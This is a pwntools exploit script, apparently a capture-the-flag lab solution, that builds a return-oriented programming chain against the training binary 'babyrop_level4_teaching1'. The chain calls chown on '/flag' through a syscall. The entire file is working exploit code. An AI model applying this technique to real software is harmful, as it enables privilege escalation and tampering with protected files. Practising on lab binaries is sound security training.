#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level4_teaching1'
r = ROP(context.binary)
e = ELF('./babyrop_level4_teaching1')
#p = gdb.debug(['./babyrop_level4_teaching1'], 'b *read')
p = process('./babyrop_level4_teaching1')
p.recvuntil(b'at: ')
getGadget = lambda x: p64(r.find_gadget(x).address)
stackaddr = int(p.recv(14), 16)
chain = getGadget(['pop r10', 'ret'])
chain += b'/flag\x00\x00\x00'
chain += getGadget(['pop rax', 'ret'])
chain += p64(92)
# there is no pop rbx alone so i had to use this gadget
chain += getGadget(['pop rdi', 'ret'])
chain += p64(stackaddr+120+8)
chain += getGadget(['pop rsi', 'ret'])
chain += p64(1000)
chain += getGadget(['pop rdx', 'ret'])
chain += p64(1000)
chain += getGadget(['syscall'])
# send the ROP chain
p.send(fit({120:chain}))
#p.close()
p.interactive()